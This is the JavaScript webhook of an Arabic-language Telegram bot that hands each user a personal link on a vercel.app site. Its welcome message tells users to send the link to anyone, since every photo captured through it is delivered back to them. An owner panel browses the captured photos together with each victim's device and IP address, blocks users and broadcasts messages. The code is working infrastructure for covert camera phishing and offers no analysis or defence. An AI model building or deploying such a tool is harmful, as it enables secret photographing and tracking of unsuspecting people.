// api/webhook.js — VANTA for WORM
// بوت @Saleckbz_cam_bot

const SB_URL = process.env.SUPABASE_URL;
const SB_KEY = process.env.SUPABASE_SERVICE_KEY;
const OWNER_TG = 'Saleck_bz';

const broadcastMode = {};
const broadcastPending = {};

async function sb(path, method, body) {
  const r = await fetch(SB_URL + '/rest/v1/' + path, {
    method: method || 'GET',
    headers: {
      'apikey': SB_KEY,
      'Authorization': 'Bearer ' + SB_KEY,
      'Content-Type': 'application/json',
      'Prefer': 'return=representation'
    },
    body: body ? JSON.stringify(body) : undefined
  });
  try { return await r.json(); } catch (e) { return null; }
}

export default async function handler(req, res) {
  if (req.method !== 'POST') { res.status(200).send('OK'); return; }

  const TG_TOKEN = process.env.TG_TOKEN;
  const OWNER_CHAT = process.env.TG_CHAT;
  if (!TG_TOKEN) { res.status(500).json({ ok: false }); return; }

  let update;
  try { update = typeof req.body === 'string' ? JSON.parse(req.body) : req.body; }
  catch (e) { res.status(200).send('OK'); return; }

  const cbq = update && update.callback_query;
  const msg = update && update.message;

  async function api(method, data) {
    return await fetch('https://api.telegram.org/bot' + TG_TOKEN + '/' + method, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
  }

  async function send(chat, text, kb) {
    const b = { chat_id: chat, text: text, parse_mode: 'HTML' };
    if (kb) b.reply_markup = kb;
    await api('sendMessage', b);
  }

  async function editMsg(chat, msgId, text, kb) {
    const b = { chat_id: chat, message_id: msgId, text: text, parse_mode: 'HTML' };
    if (kb) b.reply_markup = kb;
    await api('editMessageText', b);
  }

  async function answerCB(id, text) {
    await api('answerCallbackQuery', { callback_query_id: id, text: text || '' });
  }

  const MENU = {
    inline_keyboard: [
      [{ text: '📊 إحصائيات', callback_data: 'stats' }, { text: '👥 المستخدمون', callback_data: 'users_0' }],
      [{ text: '📸 آخر الصور', callback_data: 'gallery_0' }, { text: '🚫 المحظورون', callback_data: 'blocked' }],
      [{ text: '📢 بث رسالة', callback_data: 'broadcast_help' }, { text: '🔍 بحث', callback_data: 'search_help' }],
      [{ text: '🔄 تحديث', callback_data: 'menu' }]
    ]
  };

  // ============ الأزرار ============
  if (cbq) {
    const data = cbq.data || '';
    const chatId = cbq.message.chat.id;
    const msgId = cbq.message.message_id;

    if (String(chatId) !== String(OWNER_CHAT)) {
      await answerCB(cbq.id, '❌ خاص');
      res.status(200).send('OK');
      return;
    }

    await answerCB(cbq.id, '✓');

    if (data === 'menu') {
      await editMsg(chatId, msgId, '🎛️ <b>لوحة التحكم</b>\n\nاختر:', MENU);
    }

    if (data === 'stats') {
      const users = await sb('users?select=chat_id') || [];
      const images = await sb('images?select=id') || [];
      const blocked = await sb('users?blocked=eq.true&select=chat_id') || [];
      const today = new Date(); today.setHours(0,0,0,0);
      const todayImages = await sb('images?select=id&created_at=gte.' + today.toISOString()) || [];

      await editMsg(chatId, msgId,
        '📊 <b>إحصائيات كاملة</b>\n\n' +
        '👥 المستخدمون: <b>' + users.length + '</b>\n' +
        '📸 الصور: <b>' + images.length + '</b>\n' +
        '📅 اليوم: <b>' + todayImages.length + '</b>\n' +
        '🚫 المحظورون: <b>' + blocked.length + '</b>',
        { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]] }
      );
    }

    if (data.startsWith('users_')) {
      const idx = parseInt(data.substring(6)) || 0;
      const users = await sb('users?order=created_at.desc&limit=100') || [];

      if (!users.length) {
        await editMsg(chatId, msgId, 'لا يوجد مستخدمون.', {
          inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]]
        });
      } else {
        const u = users[Math.abs(idx) % users.length];
        const st = u.blocked ? '🚫 محظور' : '✅ نشط';
        const imgs = await sb('images?chat_id=eq.' + u.chat_id + '&select=id') || [];

        const txt =
          '👤 <b>' + (u.name || '—') + '</b>\n' +
          '📱 ' + (u.username || '—') + '\n' +
          '🆔 <code>' + u.chat_id + '</code>\n' +
          '📅 ' + new Date(u.created_at).toLocaleDateString('ar') + '\n' +
          '📸 صور: <b>' + imgs.length + '</b>\n' +
          'الحالة: ' + st + '\n\n' +
          '<b>' + (Math.abs(idx) % users.length + 1) + ' / ' + users.length + '</b>';

        const btns = [];
        if (u.blocked) {
          btns.push([{ text: '✅ إلغاء الحظر', callback_data: 'ub_' + u.chat_id }]);
        } else {
          btns.push([{ text: '🚫 حظر', callback_data: 'b_' + u.chat_id }]);
        }
        btns.push([{ text: '💬 حسابه', url: 'tg://user?id=' + u.chat_id }]);
        btns.push([
          { text: '⬅️', callback_data: 'users_' + (Math.abs(idx) - 1 < 0 ? users.length-1 : Math.abs(idx)-1) },
          { text: '➡️', callback_data: 'users_' + ((Math.abs(idx)+1) % users.length) }
        ]);
        btns.push([{ text: '🔙 رجوع', callback_data: 'menu' }]);

        await editMsg(chatId, msgId, txt, { inline_keyboard: btns });
      }
    }

    if (data.startsWith('b_') && !data.startsWith('blocked') && !data.startsWith('broadcast')) {
      const id = data.substring(2);
      await sb('users?chat_id=eq.' + id, 'PATCH', { blocked: true });
      await answerCB(cbq.id, '🚫 تم الحظر');
      await editMsg(chatId, msgId, '🚫 تم حظر <code>' + id + '</code>',
        { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]] });
    }

    if (data.startsWith('ub_')) {
      const id = data.substring(3);
      await sb('users?chat_id=eq.' + id, 'PATCH', { blocked: false });
      await answerCB(cbq.id, '✅ تم الإلغاء');
      await editMsg(chatId, msgId, '✅ تم إلغاء الحظر عن <code>' + id + '</code>',
        { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]] });
    }

    if (data === 'blocked') {
      const bl = await sb('users?blocked=eq.true&order=created_at.desc&limit=50') || [];
      if (!bl.length) {
        await editMsg(chatId, msgId, 'لا يوجد محظورون.', {
          inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]]
        });
      } else {
        let list = '🚫 <b>المحظورون (' + bl.length + ')</b>\n\n';
        bl.slice(0, 30).forEach((u, i) => {
          list += (i+1) + '. ' + (u.name || '—') + ' — <code>' + u.chat_id + '</code>\n';
        });
        await editMsg(chatId, msgId, list, {
          inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]]
        });
      }
    }

    // معرض الصور — يُرسل الصورة نفسها
    if (data.startsWith('gallery_')) {
      const idx = parseInt(data.substring(8)) || 0;
      const imgs = await sb('images?order=created_at.desc&limit=100') || [];

      if (!imgs.length) {
        await editMsg(chatId, msgId, 'لا توجد صور.', {
          inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]]
        });
      } else {
        const im = imgs[Math.abs(idx) % imgs.length];

        if (im.image_url) {
          await api('sendPhoto', {
            chat_id: chatId,
            photo: im.image_url,
            caption: '📸 <b>صورة ' + (Math.abs(idx) % imgs.length + 1) + ' / ' + imgs.length + '</b>\n\n' +
              '🆔 <code>' + im.chat_id + '</code>\n' +
              '📱 ' + (im.device || '—') + '\n' +
              '🌐 ' + (im.ip || '—') + '\n' +
              '📅 ' + new Date(im.created_at).toLocaleString('ar'),
            parse_mode: 'HTML',
            reply_markup: {
              inline_keyboard: [
                [{ text: '👤 صاحبها', callback_data: 'finduser_' + im.chat_id }],
                [
                  { text: '⬅️', callback_data: 'gallery_' + (Math.abs(idx) - 1 < 0 ? imgs.length-1 : Math.abs(idx)-1) },
                  { text: '➡️', callback_data: 'gallery_' + ((Math.abs(idx)+1) % imgs.length) }
                ],
                [{ text: '🔙 رجوع', callback_data: 'menu' }]
              ]
            }
          });
        } else {
          await editMsg(chatId, msgId, '⚠️ الصورة غير متوفرة.', {
            inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]]
          });
        }
      }
    }

    if (data.startsWith('finduser_')) {
      const id = data.substring(9);
      const u = await sb('users?chat_id=eq.' + id);
      if (!u || !u.length) {
        await editMsg(chatId, msgId, '❌ المستخدم غير موجود.', {
          inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]]
        });
      } else {
        const usr = u[0];
        const imgs = await sb('images?chat_id=eq.' + id + '&select=id') || [];
        await editMsg(chatId, msgId,
          '👤 <b>' + (usr.name || '—') + '</b>\n' +
          '📱 ' + (usr.username || '—') + '\n' +
          '🆔 <code>' + usr.chat_id + '</code>\n' +
          '📸 صور: ' + imgs.length + '\n' +
          'الحالة: ' + (usr.blocked ? '🚫' : '✅'),
          { inline_keyboard: [
            [{ text: usr.blocked ? '✅ إلغاء الحظر' : '🚫 حظر',
              callback_data: (usr.blocked ? 'ub_' : 'b_') + usr.chat_id }],
            [{ text: '💬 حسابه', url: 'tg://user?id=' + usr.chat_id }],
            [{ text: '🔙 رجوع', callback_data: 'menu' }]
          ]}
        );
      }
    }

    if (data === 'broadcast_help') {
      broadcastMode[chatId] = true;
      await editMsg(chatId, msgId,
        '📢 <b>بث رسالة</b>\n\n✍️ أرسل الآن الرسالة التي تريد بثها للجميع.',
        { inline_keyboard: [[{ text: '❌ إلغاء', callback_data: 'broadcast_cancel' }]] }
      );
    }

    if (data === 'broadcast_cancel') {
      delete broadcastMode[chatId];
      delete broadcastPending[chatId];
      await editMsg(chatId, msgId, '❌ تم الإلغاء.', {
        inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]]
      });
    }

    if (data === 'broadcast_confirm') {
      const pendingMsg = broadcastPending[chatId];
      if (!pendingMsg) {
        await editMsg(chatId, msgId, '❌ لا توجد رسالة.', {
          inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]]
        });
      } else {
        const users = await sb('users?select=chat_id') || [];
        let sent = 0;
        for (const u of users) {
          try {
            await send(u.chat_id, '📢 <b>رسالة من المبرمج</b>\n\n' + pendingMsg);
            sent++;
          } catch (e) {}
        }
        delete broadcastMode[chatId];
        delete broadcastPending[chatId];
        await editMsg(chatId, msgId, '✅ تم الإرسال إلى <b>' + sent + '</b> مستخدم.', {
          inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]]
        });
      }
    }

    if (data === 'search_help') {
      await editMsg(chatId, msgId,
        '🔍 <b>بحث</b>\n\nأرسل:\n<code>/find 123456789</code>',
        { inline_keyboard: [[{ text: '🔙 رجوع', callback_data: 'menu' }]] }
      );
    }

    res.status(200).send('OK');
    return;
  }

  // ============ الرسائل ============
  if (!msg || !msg.text) { res.status(200).send('OK'); return; }

  const chatId = msg.chat.id;
  const text = msg.text.trim();
  const name = (msg.from && (msg.from.first_name || msg.from.username)) || 'صديق';
  const username = (msg.from && msg.from.username) ? '@' + msg.from.username : '';
  const isOwner = String(chatId) === String(OWNER_CHAT);

  if (isOwner && broadcastMode[chatId]) {
    broadcastPending[chatId] = text;
    delete broadcastMode[chatId];
    await send(chatId,
      '📢 <b>معاينة الرسالة</b>:\n\n' + text + '\n\nهل تريد إرسالها للجميع؟',
      { inline_keyboard: [
        [{ text: '✅ إرسال للجميع', callback_data: 'broadcast_confirm' }],
        [{ text: '❌ إلغاء', callback_data: 'broadcast_cancel' }]
      ]}
    );
    res.status(200).send('OK');
    return;
  }

  if (isOwner) {
    if (text === '/start' || text === '/admin' || text === '/menu') {
      await send(chatId, '🎛️ <b>لوحة التحكم</b>\n\nاختر:', MENU);
      res.status(200).send('OK');
      return;
    }

    if (text.startsWith('/find ')) {
      const id = text.substring(6).trim();
      const u = await sb('users?chat_id=eq.' + id);
      if (!u || !u.length) {
        await send(chatId, '❌ غير موجود');
      } else {
        const usr = u[0];
        const imgs = await sb('images?chat_id=eq.' + id + '&select=id') || [];
        await send(chatId,
          '👤 <b>' + (usr.name || '—') + '</b>\n' +
          '🆔 <code>' + usr.chat_id + '</code>\n' +
          '📸 صور: ' + imgs.length + '\n' +
          'الحالة: ' + (usr.blocked ? '🚫' : '✅'),
          { inline_keyboard: [[
            { text: usr.blocked ? '✅ إلغاء الحظر' : '🚫 حظر',
              callback_data: (usr.blocked ? 'ub_' : 'b_') + usr.chat_id }
          ]] }
        );
      }
      res.status(200).send('OK');
      return;
    }

    if (text.startsWith('/broadcast ')) {
      const message = text.substring(11).trim();
      if (!message) { await send(chatId, '❌ اكتب رسالة'); res.status(200).send('OK'); return; }
      const users = await sb('users?select=chat_id') || [];
      let sent = 0;
      for (const u of users) {
        try {
          await send(u.chat_id, '📢 <b>رسالة من المبرمج</b>\n\n' + message);
          sent++;
        } catch (e) {}
      }
      await send(chatId, '✅ تم الإرسال إلى <b>' + sent + '</b> مستخدم');
      res.status(200).send('OK');
      return;
    }
  }

  const b = await sb('users?chat_id=eq.' + chatId + '&blocked=eq.true');
  if (b && b.length > 0) {
    await send(chatId, '🚫 أنت محظور من استخدام هذا البوت.');
    res.status(200).send('OK');
    return;
  }

  if (text === '/start' || text === '/help') {
    const link = 'https://camera-one-henna.vercel.app/t/' + chatId;
    const existing = await sb('users?chat_id=eq.' + chatId);
    if (!existing || existing.length === 0) {
      await sb('users', 'POST', { chat_id: chatId, name: name, username: username, link: link });
    }

    await send(chatId,
      '👋 أهلاً <b>' + name + '</b>!\n\n' +
      '👨‍💻 المبرمج: <a href="https://t.me/' + OWNER_TG + '">@' + OWNER_TG + '</a>\n\n' +
      '🎁 <b>رابطك الخاص</b>:\n\n' +
      '<code>' + link + '</code>\n\n' +
      '📸 أرسله لأي شخص.\nكل صورة تُلتقط عبره <b>ستصلك هنا</b>.',
      { inline_keyboard: [
        [{ text: '💬 تواصل مع المبرمج', url: 'https://t.me/' + OWNER_TG }],
        [{ text: '📋 نسخ رابطي', url: link }],
        [{ text: '📊 إحصائياتي', callback_data: 'mystats' }]
      ]}
    );

    if (!isOwner) {
      await send(OWNER_CHAT,
        '🔔 <b>مستخدم جديد</b>\n\n' +
        '👤 ' + name + '\n' +
        '📱 ' + (username || '—') + '\n' +
        '🆔 <code>' + chatId + '</code>'
      );
    }

    res.status(200).send('OK');
    return;
  }

  if (text === '/mystats' || text === '/info') {
    const imgs = await sb('images?chat_id=eq.' + chatId + '&select=id') || [];
    await send(chatId,
      '📊 <b>إحصائياتك</b>\n\n' +
      '📸 الصور المستلمة: <b>' + imgs.length + '</b>\n' +
      '🆔 <code>' + chatId + '</code>'
    );
    res.status(200).send('OK');
    return;
  }

  const link2 = 'https://camera-one-henna.vercel.app/t/' + chatId;
  await send(chatId, '🔗 رابطك:\n<code>' + link2 + '</code>',
    { inline_keyboard: [[{ text: '📋 نسخ', url: link2 }]] });

  res.status(200).send('OK');
      }
